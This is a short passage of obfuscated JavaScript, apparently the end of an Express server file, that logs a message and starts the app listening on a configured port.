_0x281818=_0x23a97a;console[_0x281818(0x173)](_0x281818(0x125),_0x358ca9);}),app['listen'](PORT,()=>console['log'](_0x23a97a(0x165)+PORT+'!'));
